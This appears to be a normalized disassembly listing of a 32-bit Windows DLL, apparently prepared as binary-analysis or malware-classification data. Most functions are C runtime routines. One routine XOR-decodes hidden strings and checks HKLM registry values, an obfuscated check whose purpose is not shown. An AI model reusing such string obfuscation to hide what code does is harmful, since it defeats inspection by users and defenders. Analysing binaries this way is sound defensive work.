lea ebx [ esi + 0xd5c ]
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
push edx
push ebx
lea ecx [ edi + 0x12 ]
call sub_10055350
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov [ esi + 0xd58 ] eax
mov edi 0x1
jmp r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push ebx
mov ecx 0x10
call sub_10055350
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x64 ] edi
sub_10057830
push ebp
mov ebp esp
push 0xffffffff
push sub_10080b88
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xb8 ] bl
je r-xdata
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_1003eba0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xbc ] ebx
mov eax [ esi + 0xc4 ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] ebx
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] ebx
sub_100578cd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_1000977c
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_10008102
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_10022b5a
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_10008102
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_100203c5
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_10022b5a
push [ ebp - 0x8 ]
call sub_10022b5a
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_10048e19
push ebx
call sub_10022b5a
push [ ebp - 0x8 ]
call sub_10022b5a
push [ ebp - 0x4 ]
call sub_10022b5a
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_10022b5a
push [ esi + 0xb0 ]
call sub_10022b5a
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10057c30
push ebp
mov ebp esp
push 0xffffffff
push sub_1008095b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_1005f140
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_10058a25
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10057cd0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10042f30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1003d8d0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1000d6f0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10057d90
push ebp
mov ebp esp
push 0xffffffff
push sub_10080488
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] edi
cmp eax edi
jne r-xdata
cmp ecx edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_10005940
lea eax [ edi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_10005940
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x14 ]
call sub_1005a590
test eax eax
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_10005940
mov eax 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
lea ebx [ esi + eax * 4 ]
cmp esi ebx
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_10005940
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x14 ]
call sub_10005940
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0xa
jae r-xdata
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
push ecx
push edx
mov ecx 0x104
call sub_10055350
test eax eax
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_10005940
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ ebp + 0xc ] 0x208
add esi 0x4
inc edi
cmp esi ebx
jne r-xdata
sub_10057ed0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_10057f23
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_10039c8c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_10039c8c
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_10039c8c
and [ eax + 0x90 ] 0x0
jmp sub_10059574
sub_10057f80
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ebx
sar eax 0x2
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx edi
je r-xdata
cmp eax 0x20
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
call sub_10043fb0
mov ecx [ ebp - 0x8 ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov esi eax
cdq
sub eax edx
sar eax 0x1
add esi eax
mov eax [ ebp - 0x4 ]
mov edx edi
sub edx eax
sub ecx ebx
add esp 0x10
and edx 0xfffffffc
and ecx 0xfffffffc
cmp ecx edx
mov edx [ ebp + 0x14 ]
push edx
push esi
jge r-xdata
mov edx [ ebp + 0x14 ]
push edx
push edi
push ebx
call sub_1006c6d0
add esp 0xc
mov eax edi
sub eax ebx
and eax 0xfffffffc
cmp eax 0x4
jle r-xdata
push edi
push eax
call sub_10057f80
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
push eax
push ebx
call sub_10057f80
mov ecx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ecx
mov ebx ecx
jmp r-xdata
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax edi
call sub_1001a7e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx edi
mov eax ebx
call sub_1000dc50
add esp 0x4
test esi esi
jle r-xdata
mov eax edi
sub eax ebx
sar eax 0x2
add esp 0x10
cmp eax 0x20
jg r-xdata
sub_10058063
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10022e30
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10058100
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1001d628
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1003a399
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1005dc2a
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_1002c212
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1001d628
mov edi [ DecodePointer@IAT ]
push sub_10002a14
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1000977c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_100028b0
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_10058280
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push r--data
push ecx
mov edx 0xa
mov [ ebp - 0x1c ] 0x0
call sub_1006c960
add esp 0xc
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
lea eax [ ebp - 0x18 ]
mov [ esi ] dx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
call sub_100531b0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_100582fb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_10044159
dec [ ebp + 0x1c ]
jne r-xdata
sub_10058326
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_10058612 ]
jmp [ eax * 4 + jump_table_100585b6 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10037d87
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000661e
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1005864b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1001d849
mov eax esi
sub_100586b0
push ebp
mov ebp esp
sub esp 0x2b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff82
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x48 ]
push edx
push 0x80000002
mov [ ebp - 0x16 ] ax
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x2c
call sub_100429d0
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x2ac ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2a8 ]
[ edi ]
lea edx [ ebp - 0x2b4 ]
mov eax 0xa
mov [ ebp - 0x2b0 ] 0x206
call sub_100429d0
lea eax [ ebp - 0x2b0 ]
push eax
mov eax [ ebp - 0x2ac ]
lea ecx [ ebp - 0x2a8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
pop edi
test eax eax
je r-xdata
lea edx [ ebp - 0x2a8 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x14 ]
mov eax 0x22
call sub_100429d0
mov eax edx
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
call sub_1005dcbd
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x2ac ]
push ecx
jmp r-xdata
mov eax [ ebp - 0x2ac ]
push eax
mov edx [ ebp - 0x2ac ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call [ RegCloseKey@IAT ]
sub_1005882e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1000ab75
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_10024583
pop ecx
push eax
call sub_10027136
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_10024583
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
